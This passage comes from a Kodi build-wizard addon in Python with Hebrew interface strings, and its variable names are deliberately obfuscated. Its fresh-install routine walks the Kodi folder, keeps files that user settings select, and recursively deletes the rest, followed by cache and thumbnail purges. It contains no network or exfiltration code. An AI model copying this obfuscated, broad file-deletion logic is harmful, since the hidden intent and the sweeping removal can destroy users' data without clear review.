				elif OO00O0O00OOO00OO0 =='MyVideos99.db'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4936
				elif OO00O0O00OOO00OO0 =='MyVideos107.db'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4937
				elif OO00O0O00OOO00OO0 =='MyVideos116.db'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4938
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4939
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'skin.anonymous.mod'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4940
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'skin.Premium.mod'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4941
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'skin.anonymous.nox'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4942
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'skin.phenomenal'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4943
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.metalliq'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4944
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'skin.titan'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4946
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'pvr.iptvsimple'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4947
				elif OO00O0O00OOO00OO0 =='sources.xml'and O0O0000O00OOO0O00 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4949
				elif OO00O0O00OOO00OO0 =='quicknav.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4952
				elif OO00O0O00OOO00OO0 =='x1101.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4953
				elif OO00O0O00OOO00OO0 =='b-srtym-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4954
				elif OO00O0O00OOO00OO0 =='x1102.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4955
				elif OO00O0O00OOO00OO0 =='b-sdrvt-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4956
				elif OO00O0O00OOO00OO0 =='x1112.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4957
				elif OO00O0O00OOO00OO0 =='b-tlvvyzyh-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4958
				elif OO00O0O00OOO00OO0 =='x1111.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4959
				elif OO00O0O00OOO00OO0 =='b-tvknyshrly-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4960
				elif OO00O0O00OOO00OO0 =='x1110.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4961
				elif OO00O0O00OOO00OO0 =='b-yldym-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4962
				elif OO00O0O00OOO00OO0 =='x1114.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4963
				elif OO00O0O00OOO00OO0 =='b-mvzyqh-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4964
				elif OO00O0O00OOO00OO0 =='mainmenu.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4965
				elif OO00O0O00OOO00OO0 =='skin.Premium.mod.properties'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4966
				elif OO00O0O00OOO00OO0 =='x1122.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4968
				elif OO00O0O00OOO00OO0 =='b-spvrt-b.DATA.xml'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4969
				elif OO00O0O00OOO00OO0 =='favourites.xml'and O0O0000O00OOO0O00 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4974
				elif OO00O0O00OOO00OO0 =='guisettings.xml'and O0O0000O00OOO0O00 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4976
				elif OO00O0O00OOO00OO0 =='profiles.xml'and O0O0000O00OOO0O00 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4977
				elif OO00O0O00OOO00OO0 =='advancedsettings.xml'and O0O0000O00OOO0O00 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4978
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4979
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'program.apollo'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4980
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4981
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.telemedia'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4982
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.elementum'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4985
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4987
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'weather.yahoo'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4988
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.quasar'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4989
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'program.apollo'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4990
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4991
				elif O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4992
				elif OO00O0O00OOO00OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%OO00O0O00OOO00OO0 ,xbmc .LOGNOTICE )#line:4993
				elif OO00O0O00OOO00OO0 .endswith ('.db'):#line:4994
					try :#line:4995
						if OO00O0O00OOO00OO0 ==O0O0OO0000OOO000O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO00O0O00OOO00OO0 ,KODIV ),xbmc .LOGNOTICE )#line:4996
						else :os .remove (os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ))#line:4997
					except Exception as OO00O00OOO0O0O000 :#line:4998
						if not OO00O0O00OOO00OO0 .startswith ('Textures13'):#line:4999
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5000
							wiz .log ("-> %s"%(str (OO00O00OOO0O0O000 )),xbmc .LOGNOTICE )#line:5001
							wiz .purgeDb (os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ))#line:5002
				else :#line:5003
					DP .update (int (wiz .percentage (O0000OO000OOO00O0 ,OOO00O0OOOO00OO00 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00O0O00OOO00OO0 ),'')#line:5004
					try :os .remove (os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ))#line:5005
					except Exception as OO00O00OOO0O0O000 :#line:5006
						wiz .log ("Error removing %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:5007
						wiz .log ("-> / %s"%(str (OO00O00OOO0O0O000 )),xbmc .LOGNOTICE )#line:5008
			if DP .iscanceled ():#line:5009
				DP .close ()#line:5010
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5011
				return False #line:5012
		for OOO00O00OOOO00OO0 ,OO0000000O00OO0OO ,O000OOOOOO00O00O0 in os .walk (O00OOOO00OOOO000O ,topdown =True ):#line:5013
			OO0000000O00OO0OO [:]=[O0OOOOO00000O0O00 for O0OOOOO00000O0O00 in OO0000000O00OO0OO if O0OOOOO00000O0O00 not in EXCLUDES ]#line:5014
			for OO00O0O00OOO00OO0 in OO0000000O00OO0OO :#line:5015
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0O00OOO00OO0 ),'')#line:5016
			  if OO00O0O00OOO00OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5017
			   if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5018
			    if not (OO00O0O00OOO00OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5020
			      if not (OO00O0O00OOO00OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5021
			       if not (OO00O0O00OOO00OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5022
			        if not (OO00O0O00OOO00OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5023
			         if not (OO00O0O00OOO00OO0 =='program.apollo'and KEEPINFO =='true'):#line:5024
			          if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5025
			           if not (OO00O0O00OOO00OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5026
			            if not (OO00O0O00OOO00OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5027
			             if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5028
			              if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5029
			               if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5030
			                if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5031
			                 if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5032
			                  if not (OO00O0O00OOO00OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5033
			                   if not (OO00O0O00OOO00OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5034
			                    if not (OO00O0O00OOO00OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5035
			                     if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5036
			                      if not (OO00O0O00OOO00OO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5037
			                       if not (OO00O0O00OOO00OO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5038
			                           if not (OO00O0O00OOO00OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5042
			                            if not (OO00O0O00OOO00OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5043
			                             if not (OO00O0O00OOO00OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5044
			                              if not (OO00O0O00OOO00OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5045
			                               if not (OO00O0O00OOO00OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5046
			                                  shutil .rmtree (os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),ignore_errors =True ,onerror =None )#line:5048
			if DP .iscanceled ():#line:5049
				DP .close ()#line:5050
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5051
				return False #line:5052
		DP .close ()#line:5053
		wiz .clearS ('build')#line:5054
		if over ==True :#line:5055
			return True #line:5056
		elif install =='restore':#line:5057
			return True #line:5058
		elif install :#line:5059
			buildWizard (install ,'normal',over =True )#line:5060
		else :#line:5061
			if INSTALLMETHOD ==1 :O0O0O00000O0O0OOO =1 #line:5062
			elif INSTALLMETHOD ==2 :O0O0O00000O0O0OOO =0 #line:5063
			else :O0O0O00000O0O0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5064
			if O0O0O00000O0O0OOO ==1 :wiz .reloadFix ('fresh')#line:5065
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5066
	else :#line:5067
		if not install =='restore':#line:5068
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5069
			wiz .refresh ()#line:5070
def clearCache ():#line:5075
		wiz .clearCache ()#line:5076
def fixwizard ():#line:5080
		wiz .fixwizard ()#line:5081
def totalClean ():#line:5083
		wiz .clearCache ()#line:5085
		wiz .clearPackages ('total')#line:5086
		clearThumb ('total')#line:5087
		cleanfornewbuild ()#line:5088
def cleanfornewbuild ():#line:5089
		try :#line:5090
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5091
		except :#line:5092
			pass #line:5093
		try :#line:5094
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5095
		except :#line:5096
			pass #line:5097
		try :#line:5098
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5099
		except :#line:5100
			pass #line:5101
def clearThumb (type =None ):#line:5102
	O0O0OO0OO00O0000O =wiz .latestDB ('Textures')#line:5103
	if not type ==None :OOOO000OO0OOOOO0O =1 #line:5104
	else :OOOO000OO0OOOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0O0OO0OO00O0000O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5105
	if OOOO000OO0OOOOO0O ==1 :#line:5106
		try :wiz .removeFile (os .join (DATABASE ,O0O0OO0OO00O0000O ))#line:5107
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0O0OO0OO00O0000O )#line:5108
		wiz .removeFolder (THUMBS )#line:5109
	else :wiz .log ('Clear thumbnames cancelled')#line:5111
	wiz .redoThumbs ()#line:5112
def purgeDb ():#line:5114
	OOOOOO000OO0O0OOO =[];O000O0O0OOOOOO0OO =[]#line:5115
	for OO00OOOOOOOO0O00O ,OOOOOO00000O000O0 ,O000O00OO000O00O0 in os .walk (HOME ):#line:5116
		for O000OOO0O00O0O0OO in fnmatch .filter (O000O00OO000O00O0 ,'*.db'):#line:5117
			if O000OOO0O00O0O0OO !='Thumbs.db':#line:5118
				O0OO0OOOO00OO0000 =os .path .join (OO00OOOOOOOO0O00O ,O000OOO0O00O0O0OO )#line:5119
